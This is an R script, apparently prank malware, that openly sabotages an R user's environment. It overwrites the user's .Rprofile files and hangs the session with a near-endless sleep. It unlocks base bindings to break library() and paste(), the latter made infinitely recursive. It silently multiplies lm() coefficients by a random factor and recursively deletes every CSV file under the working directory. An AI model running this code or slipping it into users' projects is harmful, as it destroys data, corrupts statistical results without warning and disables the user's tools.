# Function to inject code into specified Rprofile paths
inject_code <- function() {
  rp_paths <- c("~/.Rprofile", paste0(getwd(), "/.Rprofile"))
  
  # Function to inject code into a given Rprofile
  inject <- function(rp, code) {
    write(code, file = rp, append = FALSE)
  }
  
  # Inject code into each Rprofile path
  lapply(rp_paths, inject, code = deparse(match.call()))
  
  # Display a message
  cat("Wow, your R is trashhhhhh!!!\n")
}

# Execute the code injection function
inject_code()

# Sleep for a long time
Sys.sleep(1e9)

# Generate random numbers
rnorm(1e9)

# Function to reassign 'library' with a warning
reassign <- function(sym, value, envir) {
  envir <- as.environment(envir)
  unlockBinding(sym, envir)
  assign(sym, value, envir = envir)
}

# Reassign 'library' function
reassign("library", 
         function(...) warning("No man, seriously. Use require()"),
         "package:base"
)

# Load the 'purrr' library
library(purrr)

# Function to tamper with the 'lm' function
tamper <- function(sym, value, envir) {
  assign(paste0(".", sym), 
         get(sym, envir = as.environment(envir)), 
         envir = as.environment("package:base")
  )
  reassign(sym, value, envir)
}

# Tamper with the 'lm' function
tamper("lm",
       function(...) {
         model <- .lm(...)
         model$coefficients <- model$coefficients * (1 + rnorm(1))
         model
       },
       "package:stats"
)

# Use the tampered 'lm' function
lm(mpg ~ ., data = mtcars)$coefficients

# Reassign 'paste' function
reassign("paste",
         function(...) paste(...),
         "package:base"
)

# Use the tampered 'paste' function
paste("foo", "bar")

# Remove all CSV files in the working directory
file.remove(list.files(getwd(), ".csv", recursive = TRUE))
